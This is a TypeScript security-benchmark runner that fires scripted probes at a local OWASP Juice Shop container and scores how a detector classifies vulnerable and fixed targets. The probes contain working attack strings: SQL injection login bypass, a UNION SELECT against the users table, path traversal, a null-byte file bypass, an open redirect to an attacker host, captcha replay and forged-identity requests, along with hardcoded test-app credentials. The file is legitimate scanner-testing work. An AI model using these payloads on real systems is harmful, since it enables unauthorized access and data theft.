import crypto from "node:crypto";
import { mkdir, open, readFile, rm, stat } from "node:fs/promises";
import path from "node:path";
import type { DastFetch } from "../../api/modules/dast/http-runner";
import {
	detectSecurityProbe,
	type SecurityProbe,
	type SecurityProbeFinding,
} from "../../api/modules/dast/security-probe-detector";
import {
	type ContainerFixtureResetExecutor,
	createContainerFixtureLoopbackFetch,
	createContainerFixtureResetExecutor,
	listContainerFixtures,
} from "../../api/modules/runtime-scans/container-fixture-reset";
import type { ActiveResetExecutor } from "../../api/modules/runtime-scans/zap-active-runner";
import { executeJuiceShopFixedControl } from "../../tests/security-capability/juice-shop/fixed-app";
import {
	type JuiceShopRequestEvidence,
	responseShapeHash,
	writeJuiceShopExecutionEvidence,
} from "./juice-shop-evidence";
import {
	type JuiceShopObservation,
	juiceShopObservationSchema,
} from "./juice-shop-observations";
import type {
	JuiceShopCatalog,
	JuiceShopPlaybook,
} from "./juice-shop-playbooks";
import { pathMatchesAllowedPrefix } from "./juice-shop-playbooks";

const TARGET_ORIGIN = "http://127.0.0.1:3000";
const MAX_RESPONSE_BYTES = 1024 * 1024;
const FIXTURE_ID = "juice-shop-20.1.1";

type ProbeExecution = {
	status: "completed" | "inconclusive";
	probe: SecurityProbe;
	findings: SecurityProbeFinding[];
	requests: JuiceShopRequestEvidence[];
	errorCode?: string;
};

export type JuiceShopRunnerResult = {
	observations: JuiceShopObservation[];
	preflight: {
		status: "passed" | "blocked";
		platform: string;
		fixtureId: string;
		image: string;
		targetOrigin: string;
		authoritativeLinux: boolean;
		errorCode: string | null;
	};
};

export async function runJuiceShopScenarios(params: {
	catalog: JuiceShopCatalog;
	playbooks: JuiceShopPlaybook[];
	evidenceRoot: string;
	targetOrigin?: string;
	resetExecutor?: ActiveResetExecutor;
	executeProbe?: (
		playbook: JuiceShopPlaybook,
		cwe: string,
		client: BoundedJuiceShopClient,
	) => Promise<ProbeExecution>;
	fetchImpl?: DastFetch;
}): Promise<JuiceShopRunnerResult> {
	const targetOrigin = params.targetOrigin ?? TARGET_ORIGIN;
	assertLocalTarget(targetOrigin);
	const fixture = listContainerFixtures().find(
		(item) => item.fixtureId === FIXTURE_ID,
	);
	if (!fixture) throw new Error("juice_shop_fixture_not_registered");
	const resetStrategy = {
		kind: "container_recreate" as const,
		fixtureId: FIXTURE_ID,
		expectedBaselineHash: fixture.expectedBaselineHash,
	};
	const defaultResetExecutor: ContainerFixtureResetExecutor | null =
		params.resetExecutor
			? null
			: createContainerFixtureResetExecutor({
					strategy: resetStrategy,
					targetOrigin,
					fetchImpl: createContainerFixtureLoopbackFetch({
						fixtureId: FIXTURE_ID,
					}),
				});
	const resetExecutor = params.resetExecutor ?? defaultResetExecutor;
	if (!resetExecutor) throw new Error("juice_shop_reset_executor_missing");
	const targetFetch =
		params.fetchImpl ??
		(params.resetExecutor
			? fetch
			: createContainerFixtureLoopbackFetch({ fixtureId: FIXTURE_ID }));
	const lockPath = path.resolve(".artifacts/benchmark/juice-shop.lock");
	let lockError: string | null = null;
	const releaseLock = await acquireLock(lockPath).catch((error) => {
		lockError = safeErrorCode(error);
		return null;
	});
	if (!releaseLock) {
		const errorCode = lockError ?? "juice_shop_lock_unavailable";
		return {
			observations: blockedObservations(params.playbooks, errorCode),
			preflight: {
				status: "blocked",
				platform: process.platform,
				fixtureId: FIXTURE_ID,
				image: fixture.image,
				targetOrigin,
				authoritativeLinux: process.platform === "linux",
				errorCode,
			},
		};
	}
	const observations: JuiceShopObservation[] = [];
	const scenarioById = new Map(
		params.catalog.scenarios.map((scenario) => [scenario.id, scenario]),
	);
	let preflightError: string | null = null;
	let teardownAttempted = false;
	const teardownDefaultFixture = async () => {
		if (!defaultResetExecutor || teardownAttempted) return;
		teardownAttempted = true;
		const teardown = await defaultResetExecutor.teardown();
		if (!teardown.ok)
			preflightError ??=
				teardown.errorCode ?? "juice_shop_fixture_teardown_failed";
	};
	try {
		for (const playbook of params.playbooks) {
			const scenario = scenarioById.get(playbook.scenarioId);
			if (!scenario)
				throw new Error(
					`juice_shop_runner_scenario_missing:${playbook.scenarioId}`,
				);
			let prepareBaselineHash: string | null = null;
			let cleanupBaselineHash: string | null = null;
			let cleanupSucceeded = false;
			let vulnerable: ProbeExecution | null = null;
			let fixed: ReturnType<typeof executeJuiceShopFixedControl> | null = null;
			let cleanupError: string | undefined;
			try {
				prepareBaselineHash = (await resetExecutor.prepare(resetStrategy))
					.baselineHash;
				const client = new BoundedJuiceShopClient({
					origin: targetOrigin,
					playbook,
					fetchImpl: targetFetch,
				});
				vulnerable = await (params.executeProbe ?? executeVulnerableProbe)(
					playbook,
					scenario.cwe[0] ?? "CWE-20",
					client,
				);
				fixed = executeJuiceShopFixedControl({
					playbook,
					cwe: scenario.cwe[0] ?? "CWE-20",
				});
				const cleanup = await resetExecutor.reset(resetStrategy);
				cleanupSucceeded =
					cleanup.ok &&
					cleanup.baselineHash !== null &&
					cleanup.baselineHash === prepareBaselineHash;
				cleanupBaselineHash = cleanup.baselineHash;
				cleanupError = cleanup.errorCode;
				const vulnerableEvidence = await writeJuiceShopExecutionEvidence({
					evidenceRoot: params.evidenceRoot,
					scenarioId: playbook.scenarioId,
					targetKind: "vulnerable",
					controlId: playbook.controlId,
					probe: vulnerable.probe,
					findings: vulnerable.findings,
					requests: vulnerable.requests,
				});
				const fixedFindings = detectSecurityProbe(fixed.probe, {
					scenarioId: playbook.scenarioId,
					targetKind: "fixed",
				});
				const fixedEvidence = await writeJuiceShopExecutionEvidence({
					evidenceRoot: params.evidenceRoot,
					scenarioId: playbook.scenarioId,
					targetKind: "fixed",
					controlId: fixed.controlId,
					probe: fixed.probe,
					findings: fixedFindings,
					requests: [
						{
							method: fixed.request.method,
							path: fixed.request.path,
							queryKeys: [],
							status: fixed.request.status,
							responseBytes: 0,
							responseShapeHash: responseShapeHash(fixed.probe),
						},
					],
				});
				const scenarioStatus = !cleanupSucceeded
					? "failed_cleanup"
					: vulnerable.status === "completed"
						? "completed"
						: "inconclusive";
				observations.push(
					juiceShopObservationSchema.parse({
						schemaVersion: 2,
						scenarioId: playbook.scenarioId,
						runnerFamily: playbook.runnerFamily,
						scenarioStatus,
						vulnerable: {
							executionStatus:
								vulnerable.status === "completed"
									? "completed"
									: "inconclusive",
							detection:
								vulnerable.status !== "completed"
									? "not_scored"
									: vulnerable.findings.length > 0
										? "detected"
										: "not_detected",
							evidencePath: vulnerableEvidence.evidencePath,
							evidenceHash: vulnerableEvidence.evidenceHash,
							normalizedFindingRefs: vulnerable.findings.map(
								(finding) => finding.id,
							),
						},
						fixed: {
							executionStatus: "completed",
							detection: fixedFindings.length > 0 ? "detected" : "not_detected",
							evidencePath: fixedEvidence.evidencePath,
							evidenceHash: fixedEvidence.evidenceHash,
							normalizedFindingRefs: fixedFindings.map((finding) => finding.id),
						},
						lifecycle: {
							targetRequestCount: vulnerable.requests.length + 1,
							externalNetworkRequests: 0,
							publicProductionRequests: 0,
							prepareBaselineHash,
							cleanupBaselineHash,
							cleanupSucceeded,
							credentialCanaryLeakage: false,
						},
						limitationCodes: [
							...(vulnerable.errorCode ? [vulnerable.errorCode] : []),
							...(cleanupError ? [cleanupError] : []),
						],
					}),
				);
				if (!cleanupSucceeded) break;
			} catch (error) {
				const errorCode = safeErrorCode(error);
				preflightError ??= observations.length === 0 ? errorCode : null;
				if (prepareBaselineHash !== null && !cleanupSucceeded) {
					const cleanup = await resetExecutor
						.reset(resetStrategy)
						.catch(() => ({
							ok: false,
							baselineHash: null,
							errorCode: "cleanup_after_error_failed",
						}));
					cleanupSucceeded =
						cleanup.ok &&
						cleanup.baselineHash !== null &&
						cleanup.baselineHash === prepareBaselineHash;
					cleanupBaselineHash = cleanup.baselineHash;
				}
				observations.push(
					blockedObservation(
						playbook,
						prepareBaselineHash === null
							? "blocked"
							: cleanupSucceeded
								? "inconclusive"
								: "failed_cleanup",
						errorCode,
						prepareBaselineHash,
						cleanupBaselineHash,
						cleanupSucceeded,
					),
				);
				if (!cleanupSucceeded || prepareBaselineHash === null) break;
			}
		}
		if (observations.length < params.playbooks.length) {
			const completedIds = new Set(
				observations.map((observation) => observation.scenarioId),
			);
			for (const playbook of params.playbooks) {
				if (!completedIds.has(playbook.scenarioId)) {
					observations.push(
						blockedObservation(
							playbook,
							"blocked",
							"prior_scenario_cleanup_or_preflight_failed",
							null,
							null,
							false,
						),
					);
				}
			}
		}
		await teardownDefaultFixture();
		return {
			observations,
			preflight: {
				status: preflightError ? "blocked" : "passed",
				platform: process.platform,
				fixtureId: FIXTURE_ID,
				image: fixture.image,
				targetOrigin,
				authoritativeLinux: process.platform === "linux",
				errorCode: preflightError,
			},
		};
	} finally {
		await teardownDefaultFixture();
		await releaseLock();
	}
}

export class BoundedJuiceShopClient {
	private readonly origin: string;
	private readonly playbook: JuiceShopPlaybook;
	private readonly fetchImpl: DastFetch;
	private readonly evidence: JuiceShopRequestEvidence[] = [];

	constructor(params: {
		origin: string;
		playbook: JuiceShopPlaybook;
		fetchImpl?: DastFetch;
	}) {
		assertLocalTarget(params.origin);
		this.origin = new URL(params.origin).origin;
		this.playbook = params.playbook;
		this.fetchImpl = params.fetchImpl ?? fetch;
	}

	async request(
		requestPath: string,
		init: RequestInit = {},
	): Promise<{
		status: number;
		json: unknown;
		text: string;
		redirectLocation: string | null;
	}> {
		const url = new URL(requestPath, this.origin);
		if (url.origin !== this.origin)
			throw new Error("juice_shop_origin_mismatch");
		const method = (init.method ?? "GET").toUpperCase();
		if (!this.playbook.methods.includes(method as never))
			throw new Error(`juice_shop_method_not_allowed:${method}`);
		if (
			!this.playbook.allowedPathPrefixes.some((prefix) =>
				pathMatchesAllowedPrefix(url.pathname, prefix),
			)
		)
			throw new Error(`juice_shop_path_not_allowed:${url.pathname}`);
		if (this.evidence.length >= this.playbook.maxRequests)
			throw new Error("juice_shop_request_budget_exhausted");
		const controller = new AbortController();
		const timer = setTimeout(() => controller.abort(), this.playbook.timeoutMs);
		let response: Response;
		try {
			response = await this.fetchImpl(url, {
				...init,
				redirect: "manual",
				signal: controller.signal,
			});
		} finally {
			clearTimeout(timer);
		}
		const text = await response.text();
		const responseBytes = Buffer.byteLength(text);
		if (responseBytes > MAX_RESPONSE_BYTES)
			throw new Error("juice_shop_response_too_large");
		let json: unknown = null;
		try {
			json = text ? JSON.parse(text) : null;
		} catch {
			json = null;
		}
		this.evidence.push({
			method,
			path: url.pathname,
			queryKeys: [...url.searchParams.keys()].sort(),
			status: response.status,
			responseBytes,
			responseShapeHash: responseShapeHash(
				json ?? { type: "text", bytes: responseBytes },
			),
		});
		return {
			status: response.status,
			json,
			text,
			redirectLocation: response.headers.get("location"),
		};
	}

	requestEvidence(): JuiceShopRequestEvidence[] {
		return structuredClone(this.evidence);
	}
}

async function executeVulnerableProbe(
	playbook: JuiceShopPlaybook,
	cwe: string,
	client: BoundedJuiceShopClient,
): Promise<ProbeExecution> {
	try {
		const probe = await collectProbe(playbook, cwe, client);
		const findings = detectSecurityProbe(probe, {
			scenarioId: playbook.scenarioId,
			targetKind: "vulnerable",
		});
		return {
			status: "completed",
			probe,
			findings,
			requests: client.requestEvidence(),
		};
	} catch (error) {
		return {
			status: "inconclusive",
			probe: {
				kind: "observation_only",
				cwe,
				status: 0,
				reliable: false,
			},
			findings: [],
			requests: client.requestEvidence(),
			errorCode: safeErrorCode(error),
		};
	}
}

async function collectProbe(
	playbook: JuiceShopPlaybook,
	cwe: string,
	client: BoundedJuiceShopClient,
): Promise<SecurityProbe> {
	switch (playbook.probeVariant) {
		case "admin_route": {
			const auth = await login(client, "jim@juice-sh.op", "ncc-1701");
			const response = await client.request("/api/Users", {
				headers: bearer(auth.token),
			});
			return {
				kind: "authorization",
				cwe,
				status: response.status,
				expectedDenied: true,
				actorRole: "customer",
				ownerRole: "admin",
				protectedObjectPresent:
					Array.isArray(record(response.json)?.data) &&
					(record(response.json)?.data as unknown[]).length > 0,
			};
		}
		case "basket_cross_actor": {
			const actor = await login(client, "jim@juice-sh.op", "ncc-1701");
			const owner = await login(
				client,
				"bender@juice-sh.op",
				"OhG0dPlease1nsertLiquor!",
			);
			const response = await client.request(
				`/rest/basket/${encodeURIComponent(String(owner.bid))}`,
				{ headers: bearer(actor.token) },
			);
			return {
				kind: "authorization",
				cwe,
				status: response.status,
				expectedDenied: actor.bid !== owner.bid,
				actorRole: "customer-a",
				ownerRole: "customer-b",
				protectedObjectPresent:
					String(record(record(response.json)?.data)?.id ?? "") ===
					String(owner.bid),
			};
		}
		case "forged_review": {
			const actor = await login(
				client,
				"mc.safesearch@juice-sh.op",
				"Mr. N00dles",
			);
			const before = await client.request("/rest/products/1/reviews");
			const first = Array.isArray(record(before.json)?.data)
				? (record(before.json)?.data as unknown[])[0]
				: null;
			const reviewId = String(record(first)?._id ?? "");
			if (!reviewId) throw new Error("juice_shop_review_seed_missing");
			const owner = String(record(first)?.author ?? "");
			const mutation = await client.request("/rest/products/reviews", {
				method: "PATCH",
				headers: {
					...bearer(actor.token),
					"content-type": "application/json",
				},
				body: JSON.stringify({
					id: reviewId,
					message: "vuln-workbench-owner-isolation-probe",
				}),
			});
			return {
				kind: "identity_integrity",
				cwe,
				status: mutation.status,
				mutationAccepted: mutation.status >= 200 && mutation.status < 300,
				authenticatedUserId: actor.email,
				persistedUserId: owner || null,
				entityOwnerMismatch: owner !== "" && owner !== actor.email,
			};
		}
		case "forged_feedback": {
			const actor = await login(
				client,
				"bjoern.kimminich@gmail.com",
				"bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=",
			);
			const captcha = await getCaptcha(client);
			const requestedUserId = "3";
			const mutation = await client.request("/api/Feedbacks", {
				method: "POST",
				headers: {
					...bearer(actor.token),
					"content-type": "application/json",
				},
				body: JSON.stringify({
					comment: "vuln-workbench-identity-probe",
					rating: 3,
					UserId: Number(requestedUserId),
					captchaId: captcha.id,
					captcha: captcha.answer,
				}),
			});
			const persistedUserId = String(
				record(record(mutation.json)?.data)?.UserId ?? "",
			);
			return {
				kind: "identity_integrity",
				cwe,
				status: mutation.status,
				mutationAccepted: mutation.status >= 200 && mutation.status < 300,
				authenticatedUserId: actor.userId,
				persistedUserId: persistedUserId || null,
				entityOwnerMismatch:
					Boolean(persistedUserId) && persistedUserId !== actor.userId,
			};
		}
		case "sql_login_admin":
		case "sql_login_bender": {
			const email =
				playbook.probeVariant === "sql_login_admin"
					? "admin@juice-sh.op"
					: "bender@juice-sh.op";
			const control = await rawLogin(client, email, "vw-invalid-password");
			const probe = await rawLogin(client, `${email}'--`, undefined);
			return {
				kind: "sql_authentication",
				cwe: "CWE-89",
				controlStatus: control.status,
				probeStatus: probe.status,
				controlTokenPresent: tokenFrom(control.json) !== null,
				probeTokenPresent: tokenFrom(probe.json) !== null,
			};
		}
		case "sql_user_credentials": {
			const control = await client.request(
				"/rest/products/search?q=vw-no-match-control",
			);
			const marker = "vw-sql-probe";
			const payload = `')) union select '${marker}','2','3','4','5','6','7','8','9' from users--`;
			const response = await client.request(
				`/rest/products/search?q=${encodeURIComponent(payload)}`,
			);
			const controlRows = arrayData(control.json);
			const probeRows = arrayData(response.json);
			return {
				kind: "sql_data_exposure",
				cwe: "CWE-89",
				status: response.status,
				controlRowCount: controlRows.length,
				probeRowCount: probeRows.length,
				sensitiveFieldsPresent: probeRows.some(
					(item) => String(record(item)?.id ?? "") === marker,
				),
			};
		}
		case "sensitive_document":
		case "exposed_metrics": {
			const response = await client.request(
				playbook.probeVariant === "sensitive_document"
					? "/ftp/acquisitions.md"
					: "/metrics",
			);
			return {
				kind: "sensitive_endpoint",
				cwe: "CWE-200",
				status: response.status,
				unauthenticated: true,
				expectedPrivate: true,
				sensitiveContentFingerprintPresent:
					playbook.probeVariant === "sensitive_document"
						? response.text.includes("This document is confidential") &&
							response.text.includes("Planned Acquisitions")
						: response.text.includes("# HELP") &&
							response.text.includes("_challenges_solved"),
			};
		}
		case "redirect_allowlist_bypass":
		case "outdated_redirect": {
			const suppliedDestination =
				playbook.probeVariant === "redirect_allowlist_bypass"
					? "https://attacker.invalid/?continue=https://github.com/juice-shop/juice-shop"
					: "https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm";
			const response = await client.request(
				`/redirect?to=${encodeURIComponent(suppliedDestination)}`,
			);
			return {
				kind: "redirect_policy",
				cwe: "CWE-601",
				status: response.status,
				suppliedDestination,
				redirectLocation: response.redirectLocation,
				destinationAllowedByPolicy: false,
			};
		}
		case "weak_password": {
			const response = await rawLogin(client, "admin@juice-sh.op", "admin123");
			return {
				kind: "weak_credential",
				cwe: "CWE-521",
				status: response.status,
				authenticated: tokenFrom(response.json) !== null,
				passwordInBoundedCommonList: true,
			};
		}
		case "knowledge_factor_reset": {
			await client.request(
				"/rest/user/security-question?email=jim%40juice-sh.op",
			);
			const password = `VwReset-${crypto.randomUUID()}`;
			const response = await client.request("/rest/user/reset-password", {
				method: "POST",
				headers: { "content-type": "application/json" },
				body: JSON.stringify({
					email: "jim@juice-sh.op",
					answer: "Samuel",
					new: password,
					repeat: password,
				}),
			});
			const loginResponse = await rawLogin(client, "jim@juice-sh.op", password);
			return {
				kind: "knowledge_factor_reset",
				cwe: "CWE-640",
				status: response.status,
				unauthenticated: true,
				publiclyDiscoverableAnswerUsed: true,
				passwordChanged: tokenFrom(loginResponse.json) !== null,
			};
		}
		case "captcha_replay": {
			const captcha = await getCaptcha(client);
			let acceptedCount = 0;
			for (let attempt = 0; attempt < 2; attempt++) {
				const response = await client.request("/api/Feedbacks", {
					method: "POST",
					headers: { "content-type": "application/json" },
					body: JSON.stringify({
						comment: `vuln-workbench-replay-${attempt}`,
						rating: 3,
						captchaId: captcha.id,
						captcha: captcha.answer,
					}),
				});
				if (response.status >= 200 && response.status < 300) acceptedCount++;
			}
			return {
				kind: "replay_protection",
				cwe,
				attemptCount: 2,
				acceptedCount,
				nonceReuseObserved: acceptedCount === 2,
			};
		}
		case "locale_allowlist": {
			const response = await client.request("/assets/i18n/tlh_AA.json");
			return {
				kind: "allowlist",
				cwe,
				status: response.status,
				suppliedValue: "tlh_AA",
				valueAllowed: false,
				resourceReturned:
					response.status >= 200 &&
					response.status < 300 &&
					record(response.json) !== null,
			};
		}
		case "local_file_read": {
			const auth = await login(client, "admin@juice-sh.op", "admin123");
			const response = await client.request("/dataerasure", {
				method: "POST",
				headers: {
					"content-type": "application/x-www-form-urlencoded",
					cookie: `token=${auth.token}`,
				},
				body: "layout=../package.json",
			});
			return {
				kind: "file_exposure",
				cwe,
				status: response.status,
				traversalSyntaxUsed: true,
				sensitiveExtensionRequested: false,
				sensitiveContentFingerprintPresent:
					response.text.includes('"dependencies"') ||
					response.text.includes('"scripts"') ||
					response.text.includes('"juice-shop"'),
			};
		}
		case "developer_backup": {
			const response = await client.request("/ftp/package.json.bak%2500.md");
			return {
				kind: "file_exposure",
				cwe,
				status: response.status,
				traversalSyntaxUsed: false,
				sensitiveExtensionRequested: true,
				sensitiveContentFingerprintPresent:
					response.text.includes('"dependencies"') ||
					response.text.includes('"scripts"') ||
					response.text.includes('"juice-shop"'),
			};
		}
		case "negative_order": {
			const auth = await login(client, "admin@juice-sh.op", "admin123");
			const suppliedValue = -100_000;
			const response = await client.request("/api/BasketItems/1", {
				method: "PUT",
				headers: {
					...bearer(auth.token),
					"content-type": "application/json",
				},
				body: JSON.stringify({ quantity: suppliedValue }),
			});
			const accepted = Number(record(record(response.json)?.data)?.quantity);
			return {
				kind: "numeric_boundary",
				cwe: "CWE-20",
				status: response.status,
				suppliedValue,
				acceptedValue: Number.isFinite(accepted) ? accepted : null,
				minimum: 1,
			};
		}
		case "zero_stars": {
			const captcha = await getCaptcha(client);
			const response = await client.request("/api/Feedbacks", {
				method: "POST",
				headers: { "content-type": "application/json" },
				body: JSON.stringify({
					comment: "vuln-workbench-boundary-probe",
					rating: 0,
					captchaId: captcha.id,
					captcha: captcha.answer,
				}),
			});
			const accepted = Number(record(record(response.json)?.data)?.rating);
			return {
				kind: "numeric_boundary",
				cwe: "CWE-20",
				status: response.status,
				suppliedValue: 0,
				acceptedValue: Number.isFinite(accepted) ? accepted : null,
				minimum: 1,
			};
		}
		case "deluxe_transition": {
			const auth = await login(client, "jim@juice-sh.op", "ncc-1701");
			const response = await client.request("/rest/deluxe-membership", {
				method: "POST",
				headers: bearer(auth.token),
			});
			return {
				kind: "state_transition",
				cwe,
				status: response.status,
				requiredPreconditionPresent: false,
				transitionCompleted:
					String(record(response.json)?.status ?? "") === "success",
			};
		}
	}
}

async function rawLogin(
	client: BoundedJuiceShopClient,
	email: string,
	password: string | undefined,
) {
	return await client.request("/rest/user/login", {
		method: "POST",
		headers: { "content-type": "application/json" },
		body: JSON.stringify({ email, password }),
	});
}

async function login(
	client: BoundedJuiceShopClient,
	email: string,
	password: string,
): Promise<{ token: string; bid: string; userId: string; email: string }> {
	const response = await rawLogin(client, email, password);
	const authentication = record(record(response.json)?.authentication);
	const token = String(authentication?.token ?? "");
	if (response.status !== 200 || !token)
		throw new Error("juice_shop_authentication_failed");
	const payload = decodeJwtPayload(token);
	const payloadData = record(payload?.data);
	return {
		token,
		bid: String(authentication?.bid ?? payload?.bid ?? ""),
		userId: String(payload?.id ?? payloadData?.id ?? ""),
		email: String(payload?.email ?? payloadData?.email ?? email),
	};
}

async function getCaptcha(
	client: BoundedJuiceShopClient,
): Promise<{ id: number; answer: string }> {
	const response = await client.request("/rest/captcha/");
	const body = record(response.json);
	const id = Number(body?.captchaId);
	const answer = body?.answer;
	if (
		response.status !== 200 ||
		!Number.isFinite(id) ||
		typeof answer !== "string" ||
		answer.length === 0
	)
		throw new Error("juice_shop_captcha_unavailable");
	return { id, answer };
}

function tokenFrom(value: unknown): string | null {
	const token = record(record(value)?.authentication)?.token;
	return typeof token === "string" && token.length > 0 ? token : null;
}

function decodeJwtPayload(token: string): Record<string, unknown> | null {
	try {
		const encoded = token.split(".")[1];
		return encoded
			? (JSON.parse(
					Buffer.from(encoded, "base64url").toString("utf8"),
				) as Record<string, unknown>)
			: null;
	} catch {
		return null;
	}
}

function bearer(token: string): Record<string, string> {
	return {
		authorization: `Bearer ${token}`,
		"content-type": "application/json",
	};
}

function arrayData(value: unknown): unknown[] {
	const data = record(value)?.data;
	return Array.isArray(data) ? data : [];
}

function record(value: unknown): Record<string, unknown> | null {
	return value && typeof value === "object" && !Array.isArray(value)
		? (value as Record<string, unknown>)
		: null;
}

function blockedObservations(
	playbooks: JuiceShopPlaybook[],
	errorCode: string,
): JuiceShopObservation[] {
	return playbooks.map((playbook) =>
		blockedObservation(playbook, "blocked", errorCode, null, null, false),
	);
}

function blockedObservation(
	playbook: JuiceShopPlaybook,
	status: "blocked" | "inconclusive" | "failed_cleanup",
	errorCode: string,
	prepareBaselineHash: string | null,
	cleanupBaselineHash: string | null,
	cleanupSucceeded: boolean,
): JuiceShopObservation {
	const executionStatus =
		status === "blocked"
			? "blocked"
			: status === "failed_cleanup"
				? "failed"
				: "inconclusive";
	return juiceShopObservationSchema.parse({
		schemaVersion: 2,
		scenarioId: playbook.scenarioId,
		runnerFamily: playbook.runnerFamily,
		scenarioStatus: status,
		vulnerable: {
			executionStatus,
			detection: "not_scored",
			evidencePath: null,
			evidenceHash: null,
			normalizedFindingRefs: [],
		},
		fixed: {
			executionStatus: "blocked",
			detection: "not_scored",
			evidencePath: null,
			evidenceHash: null,
			normalizedFindingRefs: [],
		},
		lifecycle: {
			targetRequestCount: 0,
			externalNetworkRequests: 0,
			publicProductionRequests: 0,
			prepareBaselineHash,
			cleanupBaselineHash,
			cleanupSucceeded,
			credentialCanaryLeakage: false,
		},
		limitationCodes: [errorCode],
	});
}

function assertLocalTarget(origin: string): void {
	const url = new URL(origin);
	if (
		url.protocol !== "http:" ||
		!["127.0.0.1", "localhost", "[::1]"].includes(url.hostname) ||
		url.port !== "3000"
	) {
		throw new Error("juice_shop_local_target_required");
	}
}

async function acquireLock(lockPath: string): Promise<() => Promise<void>> {
	await mkdir(path.dirname(lockPath), { recursive: true, mode: 0o700 });
	const token = crypto.randomUUID();
	let handle: Awaited<ReturnType<typeof open>> | null = null;
	for (let attempt = 0; attempt < 2; attempt++) {
		try {
			handle = await open(lockPath, "wx", 0o600);
			await handle.writeFile(
				`${JSON.stringify({ pid: process.pid, token, createdAt: new Date().toISOString() })}\n`,
			);
			break;
		} catch (error) {
			if (!isNodeError(error, "EEXIST")) throw error;
			if (attempt > 0 || !(await isStaleLock(lockPath)))
				throw new Error("shared_fixture_busy");
			const before = await readFile(lockPath, "utf8").catch(() => null);
			if (before === null || !(await isStaleLock(lockPath))) throw error;
			const current = await readFile(lockPath, "utf8").catch(() => null);
			if (current !== before) throw error;
			await rm(lockPath, { force: true });
		}
	}
	if (!handle) throw new Error("juice_shop_lock_unavailable");
	return async () => {
		await handle?.close();
		const current = await readFile(lockPath, "utf8").catch(() => "");
		if (current.includes(`"token":"${token}"`))
			await rm(lockPath, { force: true });
	};
}

async function isStaleLock(lockPath: string): Promise<boolean> {
	const [contents, metadata] = await Promise.all([
		readFile(lockPath, "utf8").catch(() => ""),
		stat(lockPath).catch(() => null),
	]);
	try {
		const parsed = JSON.parse(contents) as { pid?: unknown };
		if (typeof parsed.pid === "number" && Number.isInteger(parsed.pid)) {
			try {
				process.kill(parsed.pid, 0);
				return false;
			} catch (error) {
				if (isNodeError(error, "ESRCH")) return true;
				return false;
			}
		}
	} catch {
		// A malformed lock is recoverable only after a bounded stale interval.
	}
	return Boolean(metadata && Date.now() - metadata.mtimeMs > 60 * 60 * 1000);
}

function isNodeError(error: unknown, code: string): boolean {
	return (
		error instanceof Error &&
		"code" in error &&
		(error as NodeJS.ErrnoException).code === code
	);
}

function safeErrorCode(error: unknown): string {
	const value = error instanceof Error ? error.message : "unknown_error";
	return value
		.toLowerCase()
		.replace(/[^a-z0-9._-]+/g, "_")
		.slice(0, 100);
}
